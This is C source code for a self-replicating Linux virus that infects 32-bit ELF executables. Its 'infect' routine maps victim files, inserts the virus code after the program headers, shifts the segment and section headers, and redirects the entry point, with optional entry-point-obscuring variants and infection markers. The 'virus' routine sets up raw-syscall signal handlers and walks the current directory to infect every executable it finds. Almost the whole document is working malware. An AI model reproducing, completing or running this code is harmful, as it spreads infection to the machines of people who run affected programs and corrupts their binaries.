#ifndef	NEW_ENTRY
#	error	"NEW_ENTRY must be defined!"
#endif

#define	MIN_VICTIM_SIZE	1024
#define	MAX_VICTIM_SIZE	3*1024*1024
#define	ELFOSABI_TARGET	ELFOSABI_LINUX
#define	PAGE_SIZE	4096

#define	MAKE_HOLE(off,size) do {			\
	ftruncate(h,l+size);				\
	m = (char*)mremap(m,l,l + size, 0);		\
	if (m == MAP_FAILED) {				\
		goto _close;				\
	}						\
	if (off < l)					\
		memmove(m+off+size, m+off, l-off);	\
	l += size;					\
} while(0)
#define	SHIFT_SHDRS(offset,delta) do {			\
	if (ehdr->e_shoff >= offset)			\
		ehdr->e_shoff += delta;			\
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);	\
	for (i = 0; i < ehdr->e_shnum; i++)		\
		if (shdr[i].sh_offset >= offset)	\
			shdr[i].sh_offset += delta;	\
} while(0)

static int infect(char *filename)
{
	int h, l, i;
	char *m;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	Elf32_Shdr *shdr;
	/* open victim, check size, mmap... */	
	if ((h = open(filename, 2)) < 0)
		return 0;
	if ((l = lseek(h, 0, 2)) < MIN_VICTIM_SIZE || l > MAX_VICTIM_SIZE)
		goto _close;
	m = (void*)mmap((void*)0x1000, l, PROT_READ|PROT_WRITE, MAP_SHARED | MAP_FIXED, h, 0);
	if (m == MAP_FAILED)
		goto _close;
	/* check ELF header */
	ehdr = (Elf32_Ehdr*)m;
	if (	*(uint32_t*)ehdr->e_ident != 0x464c457f ||
		ehdr->e_ehsize != sizeof(Elf32_Ehdr) ||
		ehdr->e_ident[EI_CLASS] != ELFCLASS32 ||
		ehdr->e_ident[EI_DATA] != ELFDATA2LSB ||
		ehdr->e_type != ET_EXEC ||
		ehdr->e_machine != EM_386 ||
		ehdr->e_version != EV_CURRENT ||
		ehdr->e_phentsize != sizeof(Elf32_Phdr) ||
		ehdr->e_phnum > 32 || /* suspicious */
		(ehdr->e_phoff + sizeof(Elf32_Phdr) * ehdr->e_phnum) > l ||
		(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE && ehdr->e_ident[EI_OSABI] != ELFOSABI_TARGET) ||
		ehdr->e_shentsize != sizeof(Elf32_Shdr) ||
		(ehdr->e_shoff + sizeof(Elf32_Shdr) * ehdr->e_shnum) > l
	) goto _unmap;
#ifndef	EPO
	/* already infected? */
	if (m[15])
		goto _unmap;
#endif
	uint32_t old_entry = ehdr->e_entry;
	uint32_t new_text = 0, new_data = 0;
	uint8_t *text, *data;

	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);

	/* insert text */
	uint32_t t = 0, low_va = -1;
	for (i = 0; i < ehdr->e_phnum; i++) {
#ifdef	EPO
		if (phdr[i].p_type == PT_LOAD) {
			/* check markers */
			if (phdr[i].p_offset <= (l - 4)) {
				uint32_t magic = *(uint32_t*)(m + phdr[i].p_offset);
				/* we tried to infect this file, but failed, leave it alone */
				if (magic == 0x1BADF00D)
					goto _unmap;
				/* the infection process is in progress, don't interfere with it */
				if (magic == 0xFEEDF00D)
					goto _unmap;
				/* the file is infected, nothing to do */
				if (magic == 0xDEADBEEF)
					goto _unmap;
			}
			/* get lowest VA */
			if (phdr[i].p_offset == 0)
				low_va = phdr[i].p_vaddr;
		}
#endif
	}
	if (ehdr->e_phoff != sizeof(Elf32_Ehdr))
		goto _unmap;
#ifdef	EPO
	/* put the virus right after PHDR, reserve one entry */
	t = ehdr->e_phoff + (ehdr->e_phnum + 1) * sizeof(Elf32_Phdr);
#else
	t = ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr);
#endif
	text = (uint8_t*)(m + t);
	uint32_t d = ((t + text_size + 32) | 0xfff) + 1;
	data = (uint8_t*)(m + d);
	d = ((d + data_size) | 0xfff) + 1;
	MAKE_HOLE(0, d);
	memcpy(text, &__text_start, text_size);
	/* bzero space between s_text and s_data */
	bzero(text + text_size, data - (text + text_size));
	memcpy(data, &__data_start, data_size);
	/* bzero space between e_data and end of v space */
	bzero(data + data_size, (char*)(m + d) - (char*)(data + data_size) +
		ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr));
#ifdef	EPO
	/* set old_bytes in the newly infected program to zero */
	bzero(data + ((uint32_t)old_bytes - (uint32_t)&__data_start), 5);
#endif

	/* adjust headers */
	SHIFT_SHDRS(0, d);
	for (i = 0; i < ehdr->e_phnum; i++) {
		/* extend text segment downwards */
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0)
			goto L0;
		/* leave these segments in the beginning... */
		if (phdr[i].p_type == PT_PHDR)
			goto L1;
		/* shift the others */
		phdr[i].p_offset+= d;
		continue;
L0:		phdr[i].p_filesz+= d;
		phdr[i].p_memsz += d;
		new_text = phdr[i].p_vaddr - d + t;
		new_data = ((new_text + text_size) | 0xfff) + 1;
L1:		phdr[i].p_vaddr -= d;
		phdr[i].p_paddr -= d;
	}
#ifdef	EPO
	i = ehdr->e_phnum;
	/* insert additional segment with temporary virus data */
	phdr[i].p_type = PT_LOAD;
	phdr[i].p_offset = l;
	phdr[i].p_memsz = phdr[i].p_filesz = 8;
	phdr[i].p_paddr = phdr[i].p_vaddr = (low_va - d - 1024*PAGE_SIZE) + (l & 4095);
	phdr[i].p_flags = 4;
	phdr[i].p_align = 0x1000;
	ehdr->e_phnum++;
	t = l;
	MAKE_HOLE(t, 8);
	*(uint32_t*)(m + t + 0) = 0xFEEDF00D;
	*(uint32_t*)(m + t + 4) = 0;
#endif	
	/* that's all about */
	relocate(text, data, new_text, new_data, old_entry);
	ehdr->e_entry = NEW_ENTRY;
#ifndef	EPO
	m[15]++;
#endif
_unmap:	munmap(m, l);
_close:	close(h);
	return 0;
}

/* restore stack pointer and proceed to original program's entry point */
static void error(int s, volatile struct sigcontext c)
{
	c.esp = orig_esp;
	c.eip = (uint32_t)_recovery;
}

void virus(int foo)
{
	void _signal(int signum, void (*handler)(int, volatile struct sigcontext)) {
		asm("int $0x80"::"a"(__NR_signal),"b"(signum),"c"(handler));
	}
	void _mprotect(void *addr, int len, int prot) {
		asm("int $0x80"::"a"(__NR_mprotect), "b"(addr), "c"(len), "d"(prot));
	}
	/* unlock data area before any W-access */
	_mprotect(&__data_start, &__data_end - &__data_start, PROT_READ | PROT_WRITE);
	orig_esp = (uint32_t)&foo;

	/* libc is not yet available */
	_signal(SIGSEGV, error);
	_signal(SIGBUS, error);
	
	/* determine "fragments" sizes */
	text_size = &__text_end - &__text_start;
	data_size = &__data_end - &__data_start;

#ifdef	EPO
	/* how we came here from EP or from inside the host? */
	if (*(uint32_t*)old_bytes == 0) {
		/* get the path to self */
		int i, argc = *((uint32_t*)orig_esp + 8);
		char **envp = (char**)((uint32_t*)orig_esp + 9 + argc);
		for (i = 0; envp[i + 1]; i++)
			;
		for (selfexe = envp[i]; *selfexe++; )
			;
	} else
		/* we're deep in the program, there's no main's args */
		selfexe = NULL;
#endif
	/* initilize virus & find the victims to infect */
	if (init()) {
		ftw(".", (int(*)(const char*,const struct stat*,int))infect, 1);
		/* remove error handler */
		signal(SIGSEGV, SIG_DFL);
		signal(SIGBUS, SIG_DFL);
		Dprintf("\nVirus is OK!] ");
	}
#ifdef	EPO
	/* restore host early, sig. handler should not land on unpatched ret-to-host */
	if (selfexe == NULL) {
		/* restore host */
		uint8_t *patch_addr = (uint8_t*)_jmpentry + *(uint32_t*)((char*)_jmpentry + 1) + 5 ;
		uint8_t *prot_addr = (uint8_t*)((uint32_t)patch_addr & 0xffff000);
		mprotect(prot_addr, PAGE_SIZE, PROT_READ | PROT_WRITE);
		memcpy(patch_addr, old_bytes, 5);
		mprotect(prot_addr, PAGE_SIZE, PROT_READ | PROT_EXEC);
	}
#endif
}
